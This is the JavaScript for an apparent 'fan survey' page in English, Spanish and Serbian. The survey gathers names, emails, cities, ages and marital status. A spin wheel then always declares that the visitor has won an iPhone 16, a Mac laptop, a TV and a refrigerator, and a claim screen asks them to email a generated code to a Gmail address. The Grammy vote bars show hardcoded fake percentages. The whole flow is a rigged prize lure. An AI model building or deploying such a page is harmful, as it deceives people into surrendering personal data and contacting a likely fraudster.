/* ============================================
   SECRET CODE — change this to whatever you want
   ============================================ */
const SECRET_CODE = "FAN2026batchgive";

/* ============================================
   CLAIM EMAIL — change this to YOUR real email
   ============================================ */
const CLAIM_EMAIL = "necessaryassit@gmail.com";


/* ============================================
   TRANSLATIONS
   ============================================ */
const translations = {
    en: {
        lockTitle: "Enter Access Code",
        lockSub: "This survey is for fans only. Enter your code to continue.",
        lockPlaceholder: "Enter code",
        lockButton: "Unlock",
        lockWrong: "Wrong code. Please try again.",
        lockCorrect: "Code accepted! Loading survey...",

        surveyTitle: "Tell Me What You Think",
        surveySub: "Your answers help me shape what's next. Takes 1 minute.",

        qName: "Your name (or fan name)",
        qNamePh: "Your name",
        qEmail: "Email (optional)",
        qEmailPh: "you@example.com",
        qGenre: "Favorite genre of my music?",
        qExcitement: "How excited are you for new music?",
        qSongIdea: "Any song ideas or requests?",
        qSongIdeaPh: "Tell me what you want to hear...",
        qConcert: "Have you been to any of my concerts before?",
        qFriends: "Do you have friends who also enjoy my music?",
        qFanDuration: "How long have you been a fan?",
        qDiscovery: "How did you first discover my music?",
        qDiscoveryPh: "Instagram, a friend, radio, a concert...",
        qCity: "What city do you live in?",
        qCityPh: "Your city",
        qRating: "How would you rate my recent song?",
        qAge: "How old are you?",
        qAgePh: "Your age",
        qMarried: "Are you married?",
        qBestSong: "Which of my songs is the most interesting you've ever listened to?",
        qBestSongPh: "Name the song and why...",
        qFeeling: "How does my music make you feel?",
        qGrammy: "Would you vote for me at the Grammy Awards?",
        grammyNote: "See how other fans voted below 👇",

        optPop: "Pop",
        optRock: "Rock",
        optElectronic: "Electronic",
        optOther: "Other",
        optYes: "Yes",
        optNo: "No",
        optNotYet: "Not yet",
        optSome: "Some",
        optLessYear: "Less than a year",
        opt1to3: "1–3 years",
        opt3to5: "3–5 years",
        opt5plus: "5+ years",
        optPreferNot: "Prefer not to say",

        feelChoose: "Choose a feeling...",
        feelHappy: "Happy",
        feelEmotional: "Emotional",
        feelMotivated: "Motivated",
        feelCalm: "Calm",
        feelEnergetic: "Energetic",
        feelNostalgic: "Nostalgic",
        feelInspired: "Inspired",

        submitBtn: "Submit",

        wheelTitle: "Spin to Win",
        wheelSub: "Thanks for your answers! Give the wheel a spin.",
        spinButton: "SPIN",
        congratsTitle: "🎉 Congratulations! 🎉",
        congratsBody: "You have won:",
        congratsPrize: "iPhone 16 + Mac Laptop + TV + Refrigerator",

        acceptShare: "I accept to share my winning with other fans",
        acceptTerms: "I confirm I am eligible to claim this prize and accept the Terms & Conditions",
        continueButton: "Continue",

        claimTitle: "Your Claim",
        claimSub: "Send the code below to the email address to receive your prize.",
        yourCode: "Your claim code:",
        emailSubject: "Prize Claim — Fan Survey",
        emailBody: "Hello! I won the prize. My claim code is: ",
        dismissButton: "Dismiss",
        claimThanks: "Thank you! We will contact you soon to arrange delivery.",

        goodbyeTitle: "Thank you!",
        goodbyeBody: "You can close this page now."
    },

    es: {
        lockTitle: "Ingresa el código de acceso",
        lockSub: "Esta encuesta es solo para fans. Ingresa tu código para continuar.",
        lockPlaceholder: "Ingresa el código",
        lockButton: "Desbloquear",
        lockWrong: "Código incorrecto. Inténtalo de nuevo.",
        lockCorrect: "¡Código aceptado! Cargando la encuesta...",

        surveyTitle: "Dime lo que piensas",
        surveySub: "Tus respuestas me ayudan a decidir lo que viene. Solo toma 1 minuto.",

        qName: "Tu nombre (o nombre de fan)",
        qNamePh: "Tu nombre",
        qEmail: "Correo electrónico (opcional)",
        qEmailPh: "tu@ejemplo.com",
        qGenre: "¿Cuál es tu género favorito de mi música?",
        qExcitement: "¿Qué tan emocionado estás por la nueva música?",
        qSongIdea: "¿Alguna idea o petición de canción?",
        qSongIdeaPh: "Dime qué te gustaría escuchar...",
        qConcert: "¿Has estado en alguno de mis conciertos?",
        qFriends: "¿Tienes amigos que también disfrutan mi música?",
        qFanDuration: "¿Cuánto tiempo has sido fan?",
        qDiscovery: "¿Cómo descubriste mi música por primera vez?",
        qDiscoveryPh: "Instagram, un amigo, la radio, un concierto...",
        qCity: "¿En qué ciudad vives?",
        qCityPh: "Tu ciudad",
        qRating: "¿Cómo calificarías mi canción reciente?",
        qAge: "¿Cuántos años tienes?",
        qAgePh: "Tu edad",
        qMarried: "¿Estás casado/a?",
        qBestSong: "¿Cuál de mis canciones es la más interesante que has escuchado?",
        qBestSongPh: "Nombra la canción y por qué...",
        qFeeling: "¿Cómo te hace sentir mi música?",
        qGrammy: "¿Votarías por mí en los Grammy?",
        grammyNote: "Mira cómo votaron otros fans abajo 👇",

        optPop: "Pop",
        optRock: "Rock",
        optElectronic: "Electrónica",
        optOther: "Otro",
        optYes: "Sí",
        optNo: "No",
        optNotYet: "Todavía no",
        optSome: "Algunos",
        optLessYear: "Menos de un año",
        opt1to3: "1–3 años",
        opt3to5: "3–5 años",
        opt5plus: "Más de 5 años",
        optPreferNot: "Prefiero no decirlo",

        feelChoose: "Elige un sentimiento...",
        feelHappy: "Feliz",
        feelEmotional: "Emocional",
        feelMotivated: "Motivado",
        feelCalm: "Tranquilo",
        feelEnergetic: "Enérgico",
        feelNostalgic: "Nostálgico",
        feelInspired: "Inspirado",

        submitBtn: "Enviar",

        wheelTitle: "Gira y Gana",
        wheelSub: "¡Gracias por tus respuestas! Gira la ruleta.",
        spinButton: "GIRAR",
        congratsTitle: "🎉 ¡Felicidades! 🎉",
        congratsBody: "Has ganado:",
        congratsPrize: "iPhone 16 + MacBook + Televisor + Refrigerador",

        acceptShare: "Acepto compartir mi premio con otros fans",
        acceptTerms: "Confirmo que soy elegible para reclamar este premio y acepto los Términos y Condiciones",
        continueButton: "Continuar",

        claimTitle: "Tu reclamo",
        claimSub: "Envía el código de abajo al correo para recibir tu premio.",
        yourCode: "Tu código de reclamo:",
        emailSubject: "Reclamo de premio — Encuesta de fans",
        emailBody: "¡Hola! Gané el premio. Mi código de reclamo es: ",
        dismissButton: "Cerrar",
        claimThanks: "¡Gracias! Te contactaremos pronto para coordinar la entrega.",

        goodbyeTitle: "¡Gracias!",
        goodbyeBody: "Ya puedes cerrar esta página."
    },

    sr: {
        lockTitle: "Unesi pristupni kod",
        lockSub: "Ova anketa je samo za fanove. Unesi svoj kod da nastaviš.",
        lockPlaceholder: "Unesi kod",
        lockButton: "Otključaj",
        lockWrong: "Pogrešan kod. Pokušaj ponovo.",
        lockCorrect: "Kod prihvaćen! Učitavam anketu...",

        surveyTitle: "Reci mi šta misliš",
        surveySub: "Tvoji odgovori mi pomažu da odlučim šta sledi. Traje samo 1 minut.",

        qName: "Tvoje ime (ili fan ime)",
        qNamePh: "Tvoje ime",
        qEmail: "Email (opciono)",
        qEmailPh: "ti@primer.com",
        qGenre: "Koji je tvoj omiljeni žanr moje muzike?",
        qExcitement: "Koliko se raduješ novoj muzici?",
        qSongIdea: "Imaš li ideju ili želju za pesmu?",
        qSongIdeaPh: "Reci mi šta želiš da čuješ...",
        qConcert: "Da li si ikada bio/la na nekom od mojih koncerata?",
        qFriends: "Imaš li prijatelje koji takođe uživaju u mojoj muzici?",
        qFanDuration: "Koliko dugo si fan?",
        qDiscovery: "Kako si prvi put otkrio/la moju muziku?",
        qDiscoveryPh: "Instagram, prijatelj, radio, koncert...",
        qCity: "U kom gradu živiš?",
        qCityPh: "Tvoj grad",
        qRating: "Kako bi ocenio/la moju poslednju pesmu?",
        qAge: "Koliko imaš godina?",
        qAgePh: "Tvoje godine",
        qMarried: "Da li si u braku?",
        qBestSong: "Koja od mojih pesama je najzanimljivija koju si ikada slušao/la?",
        qBestSongPh: "Navedi pesmu i zašto...",
        qFeeling: "Kako se osećaš dok slušaš moju muziku?",
        qGrammy: "Da li bi glasao/la za mene na Grammy nagradama?",
        grammyNote: "Pogledaj kako su drugi fanovi glasali ispod 👇",

        optPop: "Pop",
        optRock: "Rok",
        optElectronic: "Elektronska",
        optOther: "Drugo",
        optYes: "Da",
        optNo: "Ne",
        optNotYet: "Još ne",
        optSome: "Neki",
        optLessYear: "Manje od godinu dana",
        opt1to3: "1–3 godine",
        opt3to5: "3–5 godina",
        opt5plus: "Više od 5 godina",
        optPreferNot: "Ne želim da kažem",

        feelChoose: "Izaberi osećaj...",
        feelHappy: "Srećan",
        feelEmotional: "Emotivan",
        feelMotivated: "Motivisan",
        feelCalm: "Smiren",
        feelEnergetic: "Energičan",
        feelNostalgic: "Nostalgičan",
        feelInspired: "Inspirisan",

        submitBtn: "Pošalji",

        wheelTitle: "Zavrti i osvoji",
        wheelSub: "Hvala za odgovore! Zavrti točak.",
        spinButton: "ZAVRTI",
        congratsTitle: "🎉 Čestitamo! 🎉",
        congratsBody: "Osvojio/la si:",
        congratsPrize: "iPhone 16 + Mac laptop + TV + Frižider",

        acceptShare: "Prihvatam da podelim svoju nagradu sa drugim fanovima",
        acceptTerms: "Potvrđujem da ispunjavam uslove za preuzimanje nagrade i prihvatam Uslove i odredbe",
        continueButton: "Nastavi",

        claimTitle: "Tvoje preuzimanje",
        claimSub: "Pošalji kod ispod na email adresu da primiš svoju nagradu.",
        yourCode: "Tvoj kod za preuzimanje:",
        emailSubject: "Preuzimanje nagrade — Fan anketa",
        emailBody: "Zdravo! Osvojio/la sam nagradu. Moj kod za preuzimanje je: ",
        dismissButton: "Zatvori",
        claimThanks: "Hvala! Kontaktiraćemo te uskoro radi dogovora o dostavi.",

        goodbyeTitle: "Hvala!",
        goodbyeBody: "Sada možeš zatvoriti ovu stranicu."
    }
};


/* ============================================
   GRAB THE ELEMENTS
   ============================================ */
const screenLock = document.getElementById("screen-lock");
const screenSurvey = document.getElementById("screen-survey");
const screenWheel = document.getElementById("screen-wheel");
const screenReveal = document.getElementById("screen-reveal");
const screenGoodbye = document.getElementById("screen-goodbye");

const accessCodeInput = document.getElementById("accessCode");
const unlockBtn = document.getElementById("unlockBtn");
const lockMessage = document.getElementById("lockMessage");

const surveyForm = document.getElementById("surveyForm");

const acceptShare = document.getElementById("acceptShare");
const acceptTerms = document.getElementById("acceptTerms");
const continueBtn = document.getElementById("continueBtn");
const dismissBtn = document.getElementById("dismissBtn");

const stageA = document.getElementById("stageA");
const stageB = document.getElementById("stageB");


/* ============================================
   LANGUAGE
   ============================================ */
let currentLang = "en";

function applyTranslations(lang) {
    const dict = translations[lang];
    if (!dict) return;

    document.querySelectorAll("[data-i18n]").forEach(function (el) {
        const key = el.getAttribute("data-i18n");
        if (dict[key]) el.textContent = dict[key];
    });

    document.querySelectorAll("[data-i18n-placeholder]").forEach(function (el) {
        const key = el.getAttribute("data-i18n-placeholder");
        if (dict[key]) el.setAttribute("placeholder", dict[key]);
    });

    document.documentElement.lang = lang;

    document.querySelectorAll(".lang-btn").forEach(function (btn) {
        btn.classList.toggle("active", btn.dataset.lang === lang);
    });

    currentLang = lang;
}

document.querySelectorAll(".lang-btn").forEach(function (btn) {
    btn.addEventListener("click", function () {
        applyTranslations(this.dataset.lang);
    });
});


/* ============================================
   UNLOCK BUTTON
   ============================================ */
unlockBtn.addEventListener("click", function () {
    const enteredCode = accessCodeInput.value.trim();

    if (enteredCode === SECRET_CODE) {
        lockMessage.style.color = "#22c55e";
        lockMessage.textContent = translations[currentLang].lockCorrect;

        setTimeout(function () {
            screenLock.style.display = "none";
            screenSurvey.style.display = "block";
            window.scrollTo({ top: 0, behavior: "smooth" });
        }, 700);
    } else {
        lockMessage.style.color = "#ec4899";
        lockMessage.textContent = translations[currentLang].lockWrong;
        accessCodeInput.value = "";
    }
});

accessCodeInput.addEventListener("keydown", function (event) {
    if (event.key === "Enter") unlockBtn.click();
});


/* ============================================
   SURVEY SUBMIT
   ============================================ */
surveyForm.addEventListener("submit", function (event) {
    event.preventDefault();
    screenSurvey.style.display = "none";
    screenWheel.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
});


/* ============================================
   GRAMMY BARS
   ============================================ */
const grammyYesBar = document.getElementById("grammyYesBar");
const grammyNoBar = document.getElementById("grammyNoBar");
const grammyRadios = document.querySelectorAll('input[name="grammy"]');

const GRAMMY_STARTING_YES = 78;
const GRAMMY_STARTING_NO  = 22;

grammyRadios.forEach(function (radio) {
    radio.addEventListener("change", function () {
        let yesPercent, noPercent;

        if (this.value === "Yes") {
            yesPercent = Math.min(GRAMMY_STARTING_YES + 2, 95);
            noPercent = 100 - yesPercent;
        } else {
            yesPercent = Math.max(GRAMMY_STARTING_YES - 1, 40);
            noPercent = 100 - yesPercent;
        }

        grammyYesBar.style.width = yesPercent + "%";
        grammyNoBar.style.width = noPercent + "%";
    });
});


/* ============================================
   SPIN WHEEL
   ============================================ */
const SLICE_COUNT = 8;

const wheelColors = [
    "#a855f7", "#ec4899", "#8b5cf6", "#db2777",
    "#7c3aed", "#f472b6", "#6366f1", "#be185d"
];

const wheelCanvas = document.getElementById("wheelCanvas");
const spinBtn = document.getElementById("spinBtn");
const prizeMessage = document.getElementById("prizeMessage");
const ctx = wheelCanvas.getContext("2d");

let currentRotation = 0;
let isSpinning = false;

function drawWheel() {
    const size = wheelCanvas.width;
    const radius = size / 2;
    const sliceAngle = (2 * Math.PI) / SLICE_COUNT;

    ctx.clearRect(0, 0, size, size);

    for (let i = 0; i < SLICE_COUNT; i++) {
        const start = i * sliceAngle;
        const end = start + sliceAngle;

        ctx.beginPath();
        ctx.moveTo(radius, radius);
        ctx.arc(radius, radius, radius - 4, start, end);
        ctx.closePath();
        ctx.fillStyle = wheelColors[i % wheelColors.length];
        ctx.fill();

        ctx.strokeStyle = "rgba(255,255,255,0.15)";
        ctx.lineWidth = 2;
        ctx.stroke();
    }
}

drawWheel();

spinBtn.addEventListener("click", function () {
    if (isSpinning) return;
    isSpinning = true;
    spinBtn.disabled = true;
    prizeMessage.textContent = "";

    const extraSpins = 360 * 8;
    const randomOffset = Math.floor(Math.random() * 360);
    const finalRotation = currentRotation + extraSpins + randomOffset;
    currentRotation = finalRotation;

    wheelCanvas.style.transform = "rotate(" + finalRotation + "deg)";

    setTimeout(function () {
        const t = translations[currentLang];
        prizeMessage.innerHTML =
            '<span class="congrats-title">' + t.congratsTitle + '</span><br>' +
            '<span class="congrats-body">' + t.congratsBody + '</span>';

        isSpinning = false;
        spinBtn.disabled = false;

        setTimeout(function () {
            screenWheel.style.display = "none";
            screenReveal.style.display = "block";
            window.scrollTo({ top: 0, behavior: "smooth" });
        }, 4000);
    }, 5100);
});


/* ============================================
   SCREEN 4 — two agreements, then claim
   ============================================ */
function updateContinueState() {
    continueBtn.disabled = !(acceptShare.checked && acceptTerms.checked);
}

acceptShare.addEventListener("change", updateContinueState);
acceptTerms.addEventListener("change", updateContinueState);

continueBtn.addEventListener("click", function () {
    const t = translations[currentLang];

    function segment() {
        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
        let s = "";
        for (let i = 0; i < 4; i++) {
            s += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return s;
    }
    const code = "FAN-" + segment() + "-" + segment();

    const claimCode = document.getElementById("claimCode");
    const claimEmailLink = document.getElementById("claimEmailLink");

    claimCode.textContent = code;
    claimEmailLink.textContent = CLAIM_EMAIL;
    claimEmailLink.href = "mailto:" + CLAIM_EMAIL +
        "?subject=" + encodeURIComponent(t.emailSubject) +
        "&body=" + encodeURIComponent(t.emailBody + code);

    stageA.style.display = "none";
    stageB.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
});


/* ============================================
   DISMISS BUTTON — go to goodbye screen
   ============================================ */
dismissBtn.addEventListener("click", function () {
    screenReveal.style.display = "none";
    screenGoodbye.style.display = "block";
    window.scrollTo({ top: 0, behavior: "smooth" });
});


/* ============================================
   INITIAL LANGUAGE ON LOAD
   ============================================ */
applyTranslations("en");
